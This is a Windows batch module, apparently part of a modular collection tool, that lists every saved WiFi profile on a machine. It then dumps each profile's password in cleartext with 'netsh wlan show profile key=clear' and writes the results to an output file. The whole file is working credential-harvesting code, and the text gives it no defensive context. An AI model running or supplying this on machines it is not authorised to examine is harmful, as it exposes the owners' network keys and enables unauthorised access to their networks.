REM provides: collect_wifi
REM depends: core/output
REM description: Dump saved WiFi profiles and cleartext passwords

echo === WIFI PROFILES === >> "%OUTPUT_FILE%"
netsh wlan show profiles >> "%OUTPUT_FILE%" 2>nul
echo. >> "%OUTPUT_FILE%"
echo === WIFI PASSWORDS === >> "%OUTPUT_FILE%"
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "Profile"') do (
    set "WIFI_PROFILE=%%a"
    call set "WIFI_PROFILE=%%WIFI_PROFILE:~1%%"
    echo --- Profile: %%a --- >> "%OUTPUT_FILE%"
    netsh wlan show profile name="%%a" key=clear >> "%OUTPUT_FILE%" 2>nul
    echo. >> "%OUTPUT_FILE%"
)
